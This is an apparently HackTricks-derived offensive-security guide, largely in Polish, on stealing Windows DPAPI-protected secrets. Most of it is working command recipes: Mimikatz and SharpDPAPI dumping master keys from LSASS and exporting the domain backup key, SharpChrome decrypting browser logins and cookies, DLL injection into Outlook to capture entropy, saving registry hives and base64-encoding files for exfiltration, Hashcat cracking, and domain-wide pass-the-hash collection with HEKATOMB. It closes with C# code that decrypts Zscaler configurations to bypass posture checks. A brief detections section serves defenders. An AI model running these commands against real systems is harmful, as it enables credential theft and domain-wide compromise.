# DPAPI - Wyodrębnianie haseł

{{#include ../../banners/hacktricks-training.md}}



## Czym jest DPAPI

The Data Protection API (DPAPI) jest wykorzystywane przede wszystkim w systemie Windows do **symmetric encryption of asymmetric private keys**, wykorzystując sekrety użytkownika lub systemu jako istotne źródło entropii. Takie podejście upraszcza szyfrowanie dla deweloperów, pozwalając im szyfrować dane przy użyciu klucza pochodzącego z sekretów logowania użytkownika lub, w przypadku szyfrowania systemowego, sekretów uwierzytelniania domeny systemu, dzięki czemu deweloperzy nie muszą sami zarządzać ochroną klucza szyfrowania.

Najczęstszym sposobem użycia DPAPI są funkcje **`CryptProtectData` i `CryptUnprotectData`**, które pozwalają aplikacjom na bezpieczne szyfrowanie i odszyfrowywanie danych w kontekście sesji procesu aktualnie zalogowanego użytkownika. Oznacza to, że zaszyfrowane dane mogą być odszyfrowane tylko przez tego samego użytkownika lub system, który je zaszyfrował.

Co więcej, funkcje te akceptują również **`entropy` parameter**, który jest używany przy szyfrowaniu i odszyfrowywaniu, więc aby odszyfrować coś zaszyfrowanego z użyciem tego parametru, musisz podać tę samą wartość entropy, która była użyta przy szyfrowaniu.

### Generowanie klucza użytkownika

DPAPI generuje unikalny klucz (nazywany **`pre-key`**) dla każdego użytkownika na podstawie jego poświadczeń. Klucz ten jest wyprowadzany z hasła użytkownika i innych czynników, a algorytm zależy od typu użytkownika, ale kończy się jako SHA1. Na przykład dla użytkowników domeny, **zależy on od NTLM hash użytkownika**.

To jest szczególnie interesujące, ponieważ jeśli atakujący uzyska hash hasła użytkownika, może:

- **Odszyfrować dowolne dane zaszyfrowane przy użyciu DPAPI** za pomocą klucza tego użytkownika bez konieczności kontaktowania się z jakimkolwiek API
- Spróbować **złamać hasło** offline, próbując wygenerować poprawny klucz DPAPI

Co więcej, za każdym razem gdy użytkownik szyfruje dane przy użyciu DPAPI, generowany jest nowy **master key**. Ten master key jest faktycznie używany do szyfrowania danych. Każdemu master key przypisany jest **GUID** (Globally Unique Identifier), który go identyfikuje.

Master keys są przechowywane w katalogu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gdzie `{SID}` jest Security Identifier danego użytkownika. Master key jest przechowywany zaszyfrowany przy użyciu **`pre-key`** użytkownika oraz przez **domain backup key** do odzyskiwania (czyli ten sam klucz jest przechowywany zaszyfrowany 2 razy za pomocą dwóch różnych metod).

Zauważ, że **domain key używany do zaszyfrowania master key znajduje się na domain controllers i nigdy się nie zmienia**, więc jeśli atakujący ma dostęp do kontrolera domeny, może odzyskać domain backup key i odszyfrować master keys wszystkich użytkowników w domenie.

Zaszyfrowane bloby zawierają **GUID master key**, który został użyty do zaszyfrowania danych, wewnątrz swoich nagłówków.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Tak wygląda zestaw Master Keys użytkownika:

![](<../../images/image (1121).png>)

### Generowanie klucza maszyny/systemu

To jest klucz używany przez maszynę do szyfrowania danych. Bazuje na **DPAPI_SYSTEM LSA secret**, który jest specjalnym kluczem dostępnym tylko dla użytkownika SYSTEM. Ten klucz jest używany do szyfrowania danych, które muszą być dostępne dla samego systemu, np. poświadczeń na poziomie maszyny lub sekretów systemowych.

Zauważ, że te klucze **nie mają kopii zapasowej domeny**, więc są dostępne tylko lokalnie:

- **Mimikatz** może uzyskać do nich dostęp, zrzucając LSA secrets za pomocą polecenia: `mimikatz lsadump::secrets`
- Sekret jest przechowywany w rejestrze, więc administrator może **zmodyfikować uprawnienia DACL, aby uzyskać do niego dostęp**. Ścieżka w rejestrze to: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Możliwe jest też offline extraction z plików hive rejestru. Na przykład, jako administrator na maszynie docelowej, zapisz pliki hive i wyeksfiltruj je:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Następnie na swojej maszynie analitycznej odzyskaj DPAPI_SYSTEM LSA secret z hives i użyj go do odszyfrowania machine-scope blobs (hasła zaplanowanych zadań, poświadczenia usług, profile Wi‑Fi itp.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Protected Data by DPAPI

Among the personal data protected by DPAPI are:

- Windows creds
- Internet Explorer and Google Chrome's passwords and auto-completion data
- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
- Encrypted blobs inside the register
- ...

System protected data includes:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Mając uprawnienia administratora lokalnego, można **uzyskać dostęp do pamięci LSASS**, aby wydobyć DPAPI master keys wszystkich zalogowanych użytkowników oraz klucz SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Jeśli użytkownik ma lokalne uprawnienia administratora, może uzyskać dostęp do **DPAPI_SYSTEM LSA secret**, aby odszyfrować machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Jeśli znane jest hasło lub hash NTLM użytkownika, możesz **bezpośrednio odszyfrować klucze główne użytkownika**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Jeśli jesteś w sesji jako użytkownik, możesz poprosić DC o **klucz kopii zapasowej do odszyfrowania kluczy głównych przy użyciu RPC**. Jeśli jesteś lokalnym administratorem i użytkownik jest zalogowany, możesz w tym celu **ukraść jego token sesji**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lista Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Access DPAPI Encrypted Data

### Znajdź dane zaszyfrowane DPAPI

Pliki użytkowników **chronione** zwykle znajdują się w:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Sprawdź również zamianę `\Roaming\` na `\Local\` w powyższych ścieżkach.

Przykłady enumeracji:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) może znaleźć DPAPI encrypted blobs w systemie plików, rejestrze i B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Zauważ, że [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (z tego samego repo) może być użyty do odszyfrowania przy użyciu DPAPI wrażliwych danych, takich jak cookies.

#### Chromium/Edge/Electron szybkie przepisy (SharpChrome)

- Bieżący użytkownik, interaktywne odszyfrowanie zapisanych logins/cookies (działa nawet z Chrome 127+ app-bound cookies, ponieważ dodatkowy klucz jest rozwiązywany z Credential Manager użytkownika podczas uruchamiania w user context):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Analiza offline, gdy masz tylko pliki. Najpierw wyodrębnij AES state key z profilu "Local State", a następnie użyj go do odszyfrowania cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage obejmujący całą domenę / zdalny, gdy posiadasz klucz kopii zapasowej DPAPI domeny (PVK) i uprawnienia admina na docelowym hoście:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Jeśli posiadasz DPAPI prekey/credkey użytkownika (z LSASS), możesz pominąć password cracking i bezpośrednio decrypt profile data:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notatki
- Nowsze buildy Chrome/Edge mogą przechowywać niektóre cookies przy użyciu szyfrowania "App-Bound". Offline decryption tych konkretnych cookies nie jest możliwe bez dodatkowego app-bound key; uruchom SharpChrome w kontekście docelowego użytkownika, aby pobrać go automatycznie. Zobacz post na blogu bezpieczeństwa Chrome wymieniony poniżej.

### Klucze dostępu i dane

- **Użyj SharpDPAPI** aby uzyskać poświadczenia z plików zaszyfrowanych przez DPAPI z bieżącej sesji:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pobierz credentials info** takie jak zaszyfrowane dane i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Odszyfruj masterkey użytkownika żądającego **domain backup key** za pomocą RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Narzędzie **SharpDPAPI** obsługuje także te argumenty do odszyfrowania masterkey (zauważ, że można użyć `/rpc` aby uzyskać klucz kopii zapasowej domeny, `/password` aby użyć hasła w postaci jawnej, lub `/pvk` aby wskazać plik prywatnego klucza DPAPI domeny...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Odszyfruj dane przy użyciu masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Narzędzie **SharpDPAPI** obsługuje także te argumenty dla deszyfrowania `credentials|vaults|rdg|keepass|triage|blob|ps` (zauważ, że można użyć `/rpc`, aby uzyskać klucz kopii zapasowej domeny, `/password`, aby użyć hasła w postaci jawnej, `/pvk`, aby wskazać plik prywatnego klucza domeny DPAPI, `/unprotect`, aby użyć bieżącej sesji użytkownika...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Użycie DPAPI prekey/credkey bezpośrednio (bez potrzeby hasła)

Jeśli możesz zrzucić LSASS, Mimikatz często ujawnia per-logon DPAPI key, który można użyć do odszyfrowania masterkeys użytkownika bez znajomości hasła w postaci jawnej. Przekaż tę wartość bezpośrednio do narzędzi:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Odszyfruj niektóre dane używając **bieżącej sesji użytkownika**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline decryption with Impacket dpapi.py

Jeśli posiadasz SID i hasło użytkownika-ofiary (lub NT hash), możesz odszyfrować DPAPI masterkeys i Credential Manager blobs całkowicie offline za pomocą Impacket dpapi.py.

- Zidentyfikuj artefakty na dysku:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Jeśli narzędzia do przesyłania plików są zawodne, zakoduj pliki base64 na hoście i skopiuj wynik:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Odszyfruj masterkey za pomocą SID użytkownika i password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Użyj odszyfrowanego masterkey, aby odszyfrować credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Ten workflow często odzyskuje poświadczenia domenowe zapisane przez aplikacje korzystające z Windows Credential Manager, w tym konta administracyjne (np. `*_adm`).

---

### Obsługa opcjonalnej wartości entropy ("Third-party entropy")

Niektóre aplikacje przekazują dodatkową wartość **entropy** do `CryptProtectData`. Bez tej wartości blob nie może zostać odszyfrowany, nawet jeśli znany jest prawidłowy masterkey. Pozyskanie tej entropy jest więc niezbędne przy atakowaniu poświadczeń chronionych w ten sposób (np. Microsoft Outlook, niektóre klienty VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) to user-mode DLL, która hookuje funkcje DPAPI w obrębie procesu docelowego i transparentnie rejestruje każdą przekazaną opcjonalną entropy. Uruchomienie EntropyCapture w trybie **DLL-injection** przeciwko procesom takim jak `outlook.exe` czy `vpnclient.exe` wygeneruje plik mapujący każdy bufor entropy do wywołującego procesu i odpowiadającego bloba. Uchwycone entropy można później przekazać do **SharpDPAPI** (`/entropy:`) lub **Mimikatz** (`/entropy:<file>`) w celu odszyfrowania danych.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Łamanie plików masterkey offline (Hashcat & DPAPISnoop)

Microsoft wprowadził format masterkey **context 3** począwszy od Windows 10 v1607 (2016). `hashcat` v6.2.6 (grudzień 2023) dodał hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) i **22102** (context 3), umożliwiając GPU-przyspieszone łamanie haseł użytkowników bezpośrednio z pliku masterkey. Atakujący mogą w związku z tym przeprowadzać ataki word-list lub brute-force bez interakcji z systemem docelowym.

`DPAPISnoop` (2024) automatyzuje ten proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Narzędzie może również parsować bloby Credential i Vault, odszyfrowywać je przy użyciu złamanych kluczy i eksportować hasła w postaci jawnej.

### Dostęp do danych innej maszyny

W **SharpDPAPI and SharpChrome** możesz wskazać opcję **`/server:HOST`** aby uzyskać dostęp do danych zdalnej maszyny. Oczywiście musisz mieć możliwość dostępu do tej maszyny i w poniższym przykładzie zakłada się, że **znany jest klucz szyfrowania kopii zapasowej domeny**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Inne narzędzia

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) to narzędzie automatyzujące wyodrębnianie wszystkich użytkowników i komputerów z katalogu LDAP oraz wydobycie klucza kopii zapasowej kontrolera domeny przez RPC. Skrypt następnie rozwiąże adresy IP wszystkich komputerów i wykona smbclient na wszystkich maszynach, aby pobrać wszystkie DPAPI blobs wszystkich użytkowników i odszyfrować wszystko przy użyciu klucza kopii zapasowej domeny.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Z listy komputerów wyciągniętej z LDAP można znaleźć każdą podsieć, nawet jeśli ich nie znałeś!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) potrafi automatycznie zrzucać sekrety chronione przez DPAPI. W wydaniu 2.x wprowadzono:

* Równoległe zbieranie blobów z setek hostów
* Parsowanie **context 3** masterkeys i automatyczną integrację z łamaniem Hashcat
* Wsparcie dla zaszyfrowanych ciasteczek Chrome "App-Bound" (zobacz następny rozdział)
* Nowy tryb **`--snapshot`** do wielokrotnego sondowania punktów końcowych i porównywania nowo utworzonych blobów

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) to parser w C# dla plików masterkey/credential/vault, który potrafi wyprowadzić formaty dla Hashcat/JtR i opcjonalnie wywołać łamanie automatycznie. W pełni obsługuje formaty masterkey zarówno maszynowe, jak i użytkownika do Windows 11 24H1 włącznie.


## Typowe wykrycia

- Dostęp do plików w `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i innych katalogach związanych z DPAPI.
- Szczególnie z udostępnienia sieciowego takiego jak **C$** lub **ADMIN$**.
- Użycie **Mimikatz**, **SharpDPAPI** lub podobnych narzędzi do dostępu do pamięci LSASS lub zrzutu masterkeys.
- Zdarzenie **4662**: *An operation was performed on an object* – można je skorelować z dostępem do obiektu **`BCKUPKEY`**.
- Zdarzenia **4673/4674** gdy proces żąda *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Luki 2023–2025 i zmiany w ekosystemie

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (listopad 2023). Atakujący z dostępem do sieci mógł nakłonić członka domeny do pobrania złośliwego klucza kopii zapasowej DPAPI, co umożliwia odszyfrowanie użytkownikowskich masterkeyów. Załatane w listopadowej aktualizacji kumulacyjnej – administratorzy powinni upewnić się, że DC i stacje robocze są w pełni załatane.
* **Chrome 127 “App-Bound” cookie encryption** (lipiec 2024) zastąpiło przestarzałą ochronę opartą tylko na DPAPI dodatkowym kluczem przechowywanym w **Credential Manager** użytkownika. Offline’owe odszyfrowanie ciasteczek teraz wymaga zarówno DPAPI masterkey, jak i **GCM-wrapped app-bound key**. SharpChrome v2.3 oraz DonPAPI 2.x potrafią odzyskać dodatkowy klucz przy uruchomieniu w kontekście użytkownika.


### Studium przypadku: Zscaler Client Connector – niestandardowa entropia wyprowadzana z SID

Zscaler Client Connector przechowuje kilka plików konfiguracyjnych w `C:\ProgramData\Zscaler` (np. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Każdy plik jest zaszyfrowany za pomocą **DPAPI (Machine scope)**, ale dostawca dostarcza **custom entropy**, która jest *calculated at runtime* zamiast być zapisana na dysku.

Entropia jest odbudowywana z dwóch elementów:

1. Twardo zakodowany sekret osadzony w `ZSACredentialProvider.dll`.
2. **SID** konta Windows, do którego należy konfiguracja.

Algorytm zaimplementowany w DLL jest równoważny:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Ponieważ sekret jest osadzony w DLL, który można odczytać z dysku, **każdy lokalny atakujący z uprawnieniami SYSTEM może odtworzyć entropię dla dowolnego SID** i odszyfrować bloby offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Deszyfrowanie zwraca kompletną konfigurację JSON, w tym każdy **device posture check** i jego oczekiwaną wartość – informacje bardzo przydatne przy próbach client-side bypasses.

Wskazówka: pozostałe zaszyfrowane artefakty (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) są chronione przez DPAPI **bez** entropii (`16` bajtów zerowych). Dlatego można je odszyfrować bezpośrednio za pomocą `ProtectedData.Unprotect` po uzyskaniu uprawnień SYSTEM.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
